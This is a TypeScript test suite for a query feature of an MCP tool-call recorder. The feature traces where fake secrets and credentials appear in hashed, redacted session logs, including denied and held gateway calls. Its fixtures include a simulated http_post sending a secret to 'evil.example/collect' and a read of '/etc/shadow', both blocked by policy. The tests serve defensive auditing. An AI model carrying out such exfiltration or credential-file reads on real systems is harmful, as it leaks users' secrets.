import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { GENESIS_HASH, canonicalJson, makeRecord, sha256Ref } from '../src/chain/hash.js';
import { openStore } from '../src/store/index.js';
import { Redactor } from '../src/redact/redactor.js';
import { queryStore } from '../src/query/touched.js';
import type { ChainHead, EvidenceStore } from '../src/types.js';
import type {
  AnyEvent,
  ChainRecord,
  IdentityContext,
  PolicyDecisionEvent,
  ServerContext,
  SessionEndEvent,
  SessionStartEvent,
  ToolCallEvent,
} from '../src/schema/events.js';
import { SCHEMA } from '../src/schema/events.js';

/* ------------------------------ fixtures ------------------------------ */

const SECRET = 'sk-test-XYZ-12345678';
const CREDENTIAL = 'ghp_FAKEFAKEFAKEFAKEFAKE12';
const RAW_RESULT = '{"content":[{"text":"issue created","type":"text"}]}';

const SESSION_A = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa'; // older
const SESSION_B = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb'; // newer

let eventCounter = 0;
function fakeUuid(): string {
  const n = (eventCounter++).toString(16).padStart(12, '0');
  return `00000000-0000-4000-8000-${n}`;
}

const IDENTITY: IdentityContext = {
  fingerprint: sha256Ref('jonirap|test-host|claude-code|1.2.3|ci'),
  os_user: 'jonirap',
  hostname: 'test-host',
  client_name: 'claude-code',
  client_version: '1.2.3',
  label: 'ci',
};

const IDENTITY_WITH_CRED: IdentityContext = {
  ...IDENTITY,
  credential_fingerprints: [{ name: 'GITHUB_TOKEN', ref: sha256Ref(CREDENTIAL) }],
};

const SERVER: ServerContext = {
  name: 'github-mcp',
  version: '2.1.0',
  command: 'npx -y @modelcontextprotocol/server-github',
  transport: 'stdio',
};

function sessionStart(
  sessionId: string,
  timestamp: string,
  identity: IdentityContext,
): SessionStartEvent {
  return {
    schema: SCHEMA,
    event_id: fakeUuid(),
    session_id: sessionId,
    timestamp,
    kind: 'session_start',
    identity,
    server: SERVER,
    attributes: {},
    proxy_version: '0.1.0',
    cwd: '/home/jonirap/project',
    redaction_mode: 'allowlist',
  };
}

function toolCall(
  sessionId: string,
  timestamp: string,
  tool: string,
  rawArgs: unknown,
): ToolCallEvent {
  const redactor = new Redactor();
  return {
    schema: SCHEMA,
    event_id: fakeUuid(),
    session_id: sessionId,
    timestamp,
    kind: 'tool_call',
    identity: IDENTITY,
    server: SERVER,
    attributes: {
      'gen_ai.operation.name': 'execute_tool',
      'gen_ai.tool.name': tool,
    },
    tool,
    request_id: 1,
    args: redactor.scrub(rawArgs),
    result_hash: sha256Ref(RAW_RESULT),
    result: redactor.scrub(JSON.parse(RAW_RESULT)),
    is_error: false,
    duration_ms: 4.2,
  };
}

function sessionEnd(sessionId: string, timestamp: string): SessionEndEvent {
  return {
    schema: SCHEMA,
    event_id: fakeUuid(),
    session_id: sessionId,
    timestamp,
    kind: 'session_end',
    identity: IDENTITY,
    server: SERVER,
    attributes: {},
    reason: 'child_exit',
    child_exit_code: 0,
    events_recorded: 3,
    events_dropped: 0,
  };
}

function seal(events: AnyEvent[], head: ChainHead = { seq: 0, hash: GENESIS_HASH }): ChainRecord[] {
  const out: ChainRecord[] = [];
  let h = head;
  for (const event of events) {
    const record = makeRecord(h, event);
    out.push(record);
    h = { seq: record.seq, hash: record.hash };
  }
  return out;
}

/* -------------------------------- suite -------------------------------- */

describe('queryStore (blast radius)', () => {
  let dir: string;
  let store: EvidenceStore;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    store.append(
      seal([
        // Session A (older): credential fingerprint on its session_start,
        // a tool call whose args contain the planted secret.
        sessionStart(SESSION_A, '2026-06-11T10:00:00.000Z', IDENTITY_WITH_CRED),
        toolCall(SESSION_A, '2026-06-11T10:00:01.000Z', 'create_issue', {
          api_key: SECRET,
          // Vocabulary-passing structural value (P0: bare `name` no longer
          // passes anywhere under tool_call.args) — still a 'plain' probe.
          mimeType: 'text/x-probe-target',
          title: 'hello world',
        }),
        sessionEnd(SESSION_A, '2026-06-11T10:00:02.000Z'),
        // Session B (newer): the same secret leaks into a second tool call.
        // (The leaf must be exactly the secret — refs hash whole leaves.)
        sessionStart(SESSION_B, '2026-06-11T11:00:00.000Z', IDENTITY),
        toolCall(SESSION_B, '2026-06-11T11:00:01.000Z', 'send_email', {
          token: SECRET,
          subject: 'rotation',
        }),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('finds a planted secret via RedactedRef with a sensible path', () => {
    const result = queryStore(store, SECRET);

    expect(result.needle_hash).toBe(sha256Ref(SECRET));
    expect(result.matches).toHaveLength(2);

    const [first, second] = result.matches;
    expect(first).toMatchObject({
      seq: 2,
      session_id: SESSION_A,
      kind: 'tool_call',
      name: 'create_issue',
      matched_on: 'ref',
      path: '$.args.api_key',
    });
    expect(second).toMatchObject({
      seq: 5,
      session_id: SESSION_B,
      kind: 'tool_call',
      name: 'send_email',
      matched_on: 'ref',
      path: '$.args.token',
    });
    expect(first!.timestamp).toBe('2026-06-11T10:00:01.000Z');
  });

  it('lists touched sessions newest first', () => {
    const result = queryStore(store, SECRET);
    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_B, SESSION_A]);
    const a = result.sessions[1]!;
    expect(a.server_name).toBe('github-mcp');
    expect(a.tool_call_count).toBe(1);
  });

  it('matches a credential value via identity fingerprints', () => {
    const result = queryStore(store, CREDENTIAL);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({
      seq: 1,
      session_id: SESSION_A,
      kind: 'session_start',
      matched_on: 'credential',
      path: '$.identity.credential_fingerprints[0].ref',
    });
    expect(result.matches[0]!.name).toBeUndefined();
    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_A]);
  });

  it('matches a tool name as name (not plain), case-insensitively', () => {
    const exact = queryStore(store, 'create_issue');
    expect(exact.matches).toHaveLength(1);
    expect(exact.matches[0]).toMatchObject({
      seq: 2,
      matched_on: 'name',
      path: '$.tool',
      name: 'create_issue',
    });

    const upper = queryStore(store, 'CREATE_ISSUE');
    expect(upper.matches).toHaveLength(1);
    expect(upper.matches[0]!.matched_on).toBe('name');
  });

  it('matches the server name on every event of every session', () => {
    const result = queryStore(store, 'github-mcp');
    expect(result.matches).toHaveLength(store.count());
    expect(result.matches.every((m) => m.matched_on === 'name')).toBe(true);
    expect(result.matches.every((m) => m.path === '$.server.name')).toBe(true);
  });

  it('matches an allow-listed plain string leaf as plain', () => {
    const result = queryStore(store, 'x-probe-target');
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({
      seq: 2,
      matched_on: 'plain',
      path: '$.args.mimeType',
    });

    // case-sensitive substring semantics
    expect(queryStore(store, 'probe-targ').matches).toHaveLength(1);
    expect(queryStore(store, 'PROBE-TARGET').matches).toHaveLength(0);
  });

  it('matches the raw result preimage via result_hash', () => {
    const result = queryStore(store, RAW_RESULT);
    expect(result.matches.length).toBeGreaterThanOrEqual(1);
    expect(result.matches[0]).toMatchObject({
      seq: 2,
      matched_on: 'result_hash',
      path: '$.result_hash',
    });
  });

  it('returns nothing for a value that never crossed the proxy', () => {
    const result = queryStore(store, 'zzz-never-seen-anywhere-zzz');
    expect(result.matches).toEqual([]);
    expect(result.sessions).toEqual([]);
    expect(result.needle_hash).toBe(sha256Ref('zzz-never-seen-anywhere-zzz'));
  });

  it('honors the sessionId filter', () => {
    const result = queryStore(store, SECRET, { sessionId: SESSION_A });
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]!.session_id).toBe(SESSION_A);
    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_A]);
  });

  it('an empty needle matches nothing', () => {
    const result = queryStore(store, '');
    expect(result.matches).toEqual([]);
    expect(result.sessions).toEqual([]);
  });
});

/* --------------------- hashed keys & secret_refs (P1) -------------------- */

describe('queryStore finds needles hashed as KEYS or embedded via secret_refs', () => {
  const EMAIL_KEY = 'alice@corp.example.com';
  const EMBEDDED_AWS = 'AKIAIOSFODNN7EXAMPLE';
  const SESSION_C = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc';

  let dir: string;
  let store: EvidenceStore;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-keys-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    store.append(
      seal([
        sessionStart(SESSION_C, '2026-06-12T09:00:00.000Z', IDENTITY),
        // The needle appears ONLY as an object key (P1 key redaction) — a
        // map keyed by email, never as a value leaf anywhere in the tree.
        toolCall(SESSION_C, '2026-06-12T09:00:01.000Z', 'list_users', {
          users: { [EMAIL_KEY]: { role: 'admin' } },
        }),
        // The needle appears embedded INSIDE a larger leaf, not as a whole
        // leaf by itself (P1 blast-radius miss / secret_refs).
        toolCall(SESSION_C, '2026-06-12T09:00:02.000Z', 'http_post', {
          body: `AWS_ACCESS_KEY_ID=${EMBEDDED_AWS}\nregion=us-east-1\n`,
        }),
        sessionEnd(SESSION_C, '2026-06-12T09:00:03.000Z'),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('finds a needle that was only ever used as an object key', () => {
    const result = queryStore(store, EMAIL_KEY);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({
      seq: 2,
      kind: 'tool_call',
      name: 'list_users',
      matched_on: 'ref',
    });
    // the path marks it as a key hit, not a value leaf.
    expect(result.matches[0]!.path).toContain('#key');
  });

  it('finds a secret embedded inside a larger leaf via secret_refs', () => {
    const result = queryStore(store, EMBEDDED_AWS);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({
      seq: 3,
      kind: 'tool_call',
      name: 'http_post',
      matched_on: 'ref',
    });
    expect(result.matches[0]!.path).toContain('secret_refs');
  });
});

/* ------------------------- gateway mode (additive) -------------------------
 * policy_decision events name their tool like tool_call does, and a secret
 * the boundary filter scrubbed out of a result (recorded only as a hash in
 * gateway.boundary.secret_refs) still traces back to the call.
 */

describe('queryStore — gateway-mode events (policy_decision, boundary secret_refs)', () => {
  const SESSION_D = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';
  const BOUNDARY_SECRET = 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345';
  const LONG_TOOL = 'x'.repeat(200); // over the structuralString cap -> stored as its sha256 ref
  const DENIED_ARGS = { url: 'https://evil.example/collect', body: 'payload-7f3e' };

  let dir: string;
  let store: EvidenceStore;

  function policyDecision(timestamp: string, over: Partial<PolicyDecisionEvent>): PolicyDecisionEvent {
    return {
      schema: SCHEMA,
      event_id: fakeUuid(),
      session_id: SESSION_D,
      timestamp,
      kind: 'policy_decision',
      identity: IDENTITY,
      server: SERVER,
      attributes: { 'gen_ai.tool.name': 'http_post', 'cresec.policy.decision': 'deny' },
      decision: 'deny',
      tool: 'http_post',
      request_id: 4,
      policy_hash: sha256Ref('policy bytes'),
      args_hash: sha256Ref(JSON.stringify({ body: DENIED_ARGS.body, url: DENIED_ARGS.url })),
      ...over,
    };
  }

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-gw-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    const redactor = new Redactor();
    // The delivered/recorded result no longer contains the secret; only the
    // boundary report's secret_refs does.
    const filtered: ToolCallEvent = {
      ...toolCall(SESSION_D, '2026-06-13T09:00:02.000Z', 'read_file', { path: 'secrets.env' }),
      result: redactor.scrub({ content: [{ type: 'text', text: 'KEY=[redacted:sha256:0123456789abcdef]' }] }),
      gateway: {
        decision: 'allow',
        boundary: { scanned: true, action: 'redact', secrets_found: 1, injection_found: 0, secret_refs: [sha256Ref(BOUNDARY_SECRET)] },
      },
    };
    store.append(
      seal([
        sessionStart(SESSION_D, '2026-06-13T09:00:00.000Z', IDENTITY),
        policyDecision('2026-06-13T09:00:01.000Z', {}),
        filtered,
        policyDecision('2026-06-13T09:00:03.000Z', { tool: sha256Ref(LONG_TOOL), request_id: 5 }),
        sessionEnd(SESSION_D, '2026-06-13T09:00:04.000Z'),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('a policy_decision matches its tool by name, and carries `name` like a tool_call', () => {
    const result = queryStore(store, 'HTTP_POST');
    const decision = result.matches.find((m) => m.kind === 'policy_decision');
    expect(decision).toMatchObject({ seq: 2, session_id: SESSION_D, name: 'http_post', matched_on: 'name', path: '$.tool' });
  });

  it('a secret redacted at the boundary is found via gateway.boundary.secret_refs', () => {
    const result = queryStore(store, BOUNDARY_SECRET);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({
      seq: 3,
      kind: 'tool_call',
      name: 'read_file',
      matched_on: 'ref',
      path: '$.gateway.boundary.secret_refs[0]',
    });
    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_D]);
  });

  it('an over-long tool name capped to its hash on a policy_decision is still found via $.tool', () => {
    const result = queryStore(store, LONG_TOOL);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({ seq: 4, kind: 'policy_decision', matched_on: 'ref', path: '$.tool' });
  });

  it('the args_hash of a denied call is a plain hash, not a ref leaf: the raw args are not findable through it', () => {
    // No readable payload and no RedactedRef for the arguments live on a
    // policy_decision — the tool_call (with scrubbed args) is where a raw
    // argument traces. This pins that the new kind adds nothing readable.
    const result = queryStore(store, DENIED_ARGS.body);
    expect(result.matches.filter((m) => m.kind === 'policy_decision')).toHaveLength(0);
    expect(JSON.stringify([...store.iterate()])).not.toContain(DENIED_ARGS.body);
  });
});

/* ---------------- gateway events (package A: additive kind/fields) --------------- */

describe('queryStore over gateway-mode events (policy_decision kind, tool_call.gateway fields)', () => {
  const LEAKED = 'AKIAIOSFODNN7EXAMPLE';
  const SESSION_G = 'eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee';
  const POLICY_HASH = sha256Ref('policy bytes');

  let dir: string;
  let store: EvidenceStore;

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-gateway-'));
    store = openStore({ dataDir: dir, backend: 'jsonl' });
    const start = sessionStart(SESSION_G, '2026-06-13T09:00:00.000Z', IDENTITY);
    start.policy = { hash: POLICY_HASH, name: 'laptop' };
    // The boundary filter redacted LEAKED before the model saw it; the RAW
    // result (what the store records) still carries it, hashed by the
    // redactor with a secret_ref, so a blast-radius query finds the call.
    const redactor = new Redactor();
    const rawResult = { content: [{ type: 'text', text: `key=${LEAKED} rest` }] };
    const allowed = toolCall(SESSION_G, '2026-06-13T09:00:01.000Z', 'read_file', { path: '/tmp/creds' });
    allowed.result = redactor.scrub(rawResult);
    allowed.result_hash = sha256Ref(JSON.stringify(rawResult));
    allowed.gateway = {
      decision: 'allow',
      boundary: { scanned: true, action: 'redact', secrets_found: 1, injection_found: 0, secret_refs: [sha256Ref(LEAKED)], delivered_result_hash: sha256Ref('delivered') },
    };
    const decision: PolicyDecisionEvent = {
      schema: SCHEMA,
      event_id: fakeUuid(),
      session_id: SESSION_G,
      timestamp: '2026-06-13T09:00:02.000Z',
      kind: 'policy_decision',
      identity: IDENTITY,
      server: SERVER,
      attributes: { 'gen_ai.tool.name': 'http_post', 'cresec.policy.decision': 'deny', 'cresec.policy.rule_id': 'no-exfil' },
      decision: 'deny',
      tool: 'http_post',
      request_id: 2,
      rule_id: 'no-exfil',
      policy_hash: POLICY_HASH,
      args_hash: sha256Ref('{"url":"https://evil.example"}'),
    };
    const denied = toolCall(SESSION_G, '2026-06-13T09:00:02.001Z', 'http_post', { url: 'https://evil.example', body: SECRET });
    denied.is_error = true;
    denied.error = { type: 'policy_denied' };
    denied.gateway = { decision: 'deny', rule_id: 'no-exfil' };
    store.append(seal([start, allowed, decision, denied, sessionEnd(SESSION_G, '2026-06-13T09:00:03.000Z')]));
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('finds a value the boundary filter redacted before the model saw it (via the raw result the store keeps)', () => {
    const result = queryStore(store, LEAKED);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({ seq: 2, kind: 'tool_call', name: 'read_file', matched_on: 'ref' });
    expect(result.matches[0]!.path).toContain('secret_refs');
  });

  it("finds a denied call's hashed arguments (the call never reached the server)", () => {
    const result = queryStore(store, SECRET);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({ seq: 4, kind: 'tool_call', name: 'http_post', matched_on: 'ref' });
    expect(result.matches[0]!.path).toBe('$.args.body');
  });

  it('a tool-name query lists the denied tool_call (and does not choke on the policy_decision kind)', () => {
    const result = queryStore(store, 'http_post');
    const kinds = result.matches.map((m) => m.kind);
    expect(kinds).toContain('tool_call');
    expect(result.matches.find((m) => m.kind === 'tool_call')).toMatchObject({ seq: 4, name: 'http_post', matched_on: 'name' });
    // Nothing in the store reads back in clear.
    expect(JSON.stringify([...store.iterate()])).not.toContain(LEAKED);
    expect(JSON.stringify([...store.iterate()])).not.toContain(SECRET);
  });

  it('a needle that appears nowhere yields no matches, gateway events included', () => {
    expect(queryStore(store, 'no-such-value-anywhere').matches).toEqual([]);
  });
});

/* ------------------- policy_decision.args_hash (gateway mode) -------------------
 * A denied or held call never reaches the server, so its arguments exist
 * nowhere in the chain except as `args_hash` — sha256 of their canonical
 * JSON — on the policy_decision. Querying those exact canonical arguments
 * has to name the refused call (the replay page's client-side search
 * already matches this field).
 */

describe('queryStore — policy_decision.args_hash', () => {
  const SESSION_H = 'ffffffff-ffff-4fff-8fff-ffffffffffff';
  const DENIED_ARGS = { url: 'https://evil.example/collect', body: 'payload-7f3e' };
  const HELD_ARGS = { path: '/etc/shadow', mode: 'read' };
  const DENIED_CANONICAL = canonicalJson(DENIED_ARGS);
  const HELD_CANONICAL = canonicalJson(HELD_ARGS);

  let dir: string;
  let store: EvidenceStore;

  function decision(
    timestamp: string,
    requestId: number,
    tool: string,
    argsHash: string,
    over: Partial<PolicyDecisionEvent> = {},
  ): PolicyDecisionEvent {
    return {
      schema: SCHEMA,
      event_id: fakeUuid(),
      session_id: SESSION_H,
      timestamp,
      kind: 'policy_decision',
      identity: IDENTITY,
      server: SERVER,
      attributes: { 'gen_ai.tool.name': tool, 'cresec.policy.decision': 'deny' },
      decision: 'deny',
      tool,
      request_id: requestId,
      rule_id: 'no-exfil',
      policy_hash: sha256Ref('policy bytes'),
      args_hash: argsHash,
      ...over,
    };
  }

  beforeAll(() => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-args-'));
    store = openStore({ dataDir: dir, backend: 'sqlite' });
    store.append(
      seal([
        sessionStart(SESSION_H, '2026-06-14T08:00:00.000Z', IDENTITY),
        decision('2026-06-14T08:00:01.000Z', 11, 'http_post', sha256Ref(DENIED_CANONICAL)),
        decision('2026-06-14T08:00:02.000Z', 12, 'read_file', sha256Ref(HELD_CANONICAL), {
          decision: 'hold',
          outcome: 'timeout',
          rule_id: 'needs-human',
          approval_id: 'hold-1',
          waited_ms: 30_000,
        }),
        toolCall(SESSION_H, '2026-06-14T08:00:03.000Z', 'list_dir', { path: '/tmp' }),
        sessionEnd(SESSION_H, '2026-06-14T08:00:04.000Z'),
      ]),
    );
  });

  afterAll(() => {
    store.close();
    rmSync(dir, { recursive: true, force: true });
  });

  it('finds the denied call from the exact canonical JSON of its arguments', () => {
    const result = queryStore(store, DENIED_CANONICAL);
    expect(result.needle_hash).toBe(sha256Ref(DENIED_CANONICAL));
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toEqual({
      seq: 2,
      session_id: SESSION_H,
      timestamp: '2026-06-14T08:00:01.000Z',
      kind: 'policy_decision',
      name: 'http_post',
      matched_on: 'args_hash',
      path: '$.args_hash',
    });
  });

  it('finds a HELD call the same way', () => {
    const result = queryStore(store, HELD_CANONICAL);
    expect(result.matches).toHaveLength(1);
    expect(result.matches[0]).toMatchObject({
      seq: 3,
      kind: 'policy_decision',
      name: 'read_file',
      matched_on: 'args_hash',
      path: '$.args_hash',
    });
  });

  it('lists the touched session and stays valid JSON output', () => {
    const result = queryStore(store, DENIED_CANONICAL);
    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_H]);
    expect(JSON.parse(JSON.stringify(result))).toEqual(result);
    expect(store.sessions().some((s) => s.session_id === SESSION_H)).toBe(true);
  });

  it('is exact: a different key order, a subset or a raw argument value does not match', () => {
    for (const needle of [
      JSON.stringify(DENIED_ARGS), // insertion order, not canonical order
      canonicalJson({ url: DENIED_ARGS.url }),
      DENIED_ARGS.body,
      DENIED_ARGS.url,
    ]) {
      expect(queryStore(store, needle).matches.filter((m) => m.matched_on === 'args_hash')).toEqual([]);
    }
    // ...and the arguments themselves never read back in clear.
    expect(JSON.stringify([...store.iterate()])).not.toContain(DENIED_ARGS.body);
    expect(JSON.stringify([...store.iterate()])).not.toContain(HELD_ARGS.path);
  });

  it('a stronger location still wins on the same event', () => {
    // The tool name of the denied call is a plain `name` match, which is
    // WEAKER than args_hash; an args_hash hit must be the reported one.
    const byName = queryStore(store, 'http_post');
    expect(byName.matches.find((m) => m.kind === 'policy_decision')).toMatchObject({ matched_on: 'name' });
    const byArgs = queryStore(store, DENIED_CANONICAL);
    expect(byArgs.matches[0]!.matched_on).toBe('args_hash');
  });

  it('scoping to another session finds nothing', () => {
    expect(queryStore(store, DENIED_CANONICAL, { sessionId: SESSION_A }).matches).toEqual([]);
  });
});
